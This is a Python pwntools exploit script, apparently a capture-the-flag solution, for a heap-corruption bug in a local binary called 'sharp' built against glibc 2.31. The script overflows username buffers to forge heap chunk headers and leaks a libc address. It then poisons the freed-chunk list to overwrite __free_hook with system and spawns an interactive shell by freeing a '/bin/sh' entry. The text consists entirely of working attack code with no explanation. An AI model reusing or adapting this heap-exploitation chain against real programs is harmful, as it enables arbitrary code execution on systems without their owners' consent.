from pwn import *

p = process('./sharp', env={'LD_PRELOAD':'./libc-2.31.so'})
libc = ELF('./libc-2.31.so')
bin = ELF('./sharp')
context.log_level = 'debug'
context.arch = 'x86_64'

def add_user(name):
    p.sendlineafter(b'\n> ', b'1')
    p.sendlineafter(b'Enter username: ', name)

def remove_user(idx):
    p.sendlineafter(b'\n> ', b'2')
    p.sendlineafter(b'user to remove: ', str(idx).encode())

def edit_user(idx, new_name):
    p.sendlineafter(b'\n> ', b'3')
    p.sendlineafter(b'of user to edit: ', str(idx).encode())
    p.sendlineafter(b'new username: ', new_name)

def swap_users(idx1, idx2):
    p.sendlineafter(b'\n> ', b'4')
    p.sendlineafter(b'of user to swap: ', str(idx1).encode())
    p.sendlineafter(b'of user to swap with: ', str(idx2).encode())

def print_database():
    p.sendlineafter(b'\n> ', b'5')

puts_got = 0x403f98
for i in range(4):
    add_user(str(i).encode())

edit_user(1, b'a'*0x70 + p64(0) + p64(0xa1))
edit_user(2, b'a'*0x70 + p64(0) + p64(0x31) + p64(0x404020)*4)
print_database()
p.recvuntil(b'user: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdin_']
log.success('Libc base: %#x' % libc.address)

add_user(b'/bin/sh')
for i in range(11):
    add_user(str(i).encode())

remove_user(14)
remove_user(14)

edit_user(11, b'a'*0x70 + p64(0) + p64(0x91))
edit_user(12, b'a'*0x70 + p64(0) + p64(0x81) + p64(libc.symbols['__free_hook']))
add_user(b'Hello')
add_user(p64(libc.symbols['system']))
remove_user(4)
p.interactive()